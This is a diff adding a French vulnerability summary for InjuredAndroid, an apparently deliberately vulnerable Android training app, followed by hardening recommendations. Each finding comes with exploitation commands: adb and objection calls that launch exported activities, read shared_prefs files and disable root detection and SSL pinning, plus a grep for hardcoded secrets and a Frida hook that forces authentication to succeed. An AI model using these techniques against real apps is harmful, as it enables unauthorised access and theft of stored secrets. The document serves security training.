@@ -1,0 +1,33 @@
+=== VULNÉRABILITÉS — InjuredAndroid ===
+
+[V1] ACTIVITÉS EXPORTÉES SANS PERMISSION — CRITIQUE
+  Exploitation :
+    adb shell am start -n b3nac.injuredandroid/.FlagEightLogInActivity
+    objection : android intent launch_activity b3nac.injuredandroid.FlagEightLogInActivity
+
+[V2] SECRETS HARDCODÉS — CRITIQUE
+  Exploitation : grep -r 'api_key\|secret\|password' injured_out/sources/
+
+[V3] SHAREDPREFERENCES EN CLAIR — ÉLEVÉE
+  Exploitation :
+    adb shell cat /data/data/b3nac.injuredandroid/shared_prefs/*.xml
+    objection : android preferences get
+
+[V4] AUTH CÔTÉ CLIENT HOOKABLE — CRITIQUE
+  Exploitation (Frida) :
+    FlagOneActivity.submitFlag.implementation = function() { return true; }
+
+[V5] ROOT DETECTION CONTOURNABLE — ÉLEVÉE
+  bypass_root.js / objection : android root disable
+
+[V6] SSL PINNING CONTOURNABLE — ÉLEVÉE
+  bypass_ssl.js (verifyChain Android 11+ + checkTrustedRecursive + OkHttp3)
+  objection : android sslpinning disable
+
+=== RECOMMANDATIONS ===
+- Secrets -> variables d'env / secrets manager (jamais dans le code)
+- Validation côté serveur uniquement (zero trust)
+- Android Keystore pour données sensibles
+- EncryptedSharedPreferences
+- SafetyNet / Play Integrity API anti-tampering
+- Certificate pinning résistant (network_security_config.xml)
